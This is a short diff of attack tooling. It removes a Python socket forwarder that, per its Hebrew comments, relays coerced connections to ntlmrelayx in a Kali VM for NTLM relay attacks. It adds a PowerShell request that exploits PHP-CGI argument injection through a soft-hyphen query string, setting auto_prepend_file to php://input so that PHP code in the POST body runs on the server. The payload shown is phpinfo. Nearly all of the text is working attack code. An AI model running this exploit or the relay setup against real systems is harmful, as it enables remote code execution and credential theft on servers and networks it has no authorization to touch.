@@ -1,42 +1,11 @@
-import socket
-import threading
-
-LISTEN_IP = '0.0.0.0'        # האזנה לכל כתובת
-LISTEN_PORT = 8889           # הפורט ש־coercer יכוון אליו
-FORWARD_IP = '127.0.0.1'     # Kali בתוך QEMU
-FORWARD_PORT = 8888          # Kali מאזין פה (ntlmrelayx)
-
-def handle(client_socket):
-    try:
-        forward_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        forward_socket.connect((FORWARD_IP, FORWARD_PORT))
-
-        threading.Thread(target=pipe, args=(client_socket, forward_socket)).start()
-        threading.Thread(target=pipe, args=(forward_socket, client_socket)).start()
-    except Exception as e:
-        print(f"Error in connection: {e}")
-        client_socket.close()
-
-def pipe(src, dst):
-    try:
-        while True:
-            data = src.recv(4096)
-            if not data:
-                break
-            dst.sendall(data)
-    finally:
-        src.close()
-        dst.close()
-
-def start_forwarder():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((LISTEN_IP, LISTEN_PORT))
-    server.listen(5)
-    print(f"[+] Forwarding from {LISTEN_PORT} to {FORWARD_IP}:{FORWARD_PORT}")
-
-    while True:
-        client_socket, addr = server.accept()
-        print(f"[+] Connection from {addr}")
-        threading.Thread(target=handle, args=(client_socket,)).start()
-
-start_forwarder()
+Invoke-WebRequest `
+  -Uri "http://DOMAIN/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" `
+  -Method POST `
+  -Headers @{
+      "User-Agent"   = "curl/8.3.0"
+      "Accept"       = "*/*"
+      "Content-Type" = "application/x-www-form-urlencoded"
+      "Connection"   = "keep-alive"
+  } `
+  -Body "<?php phpinfo(); ?>" `
+  -TimeoutSec 10
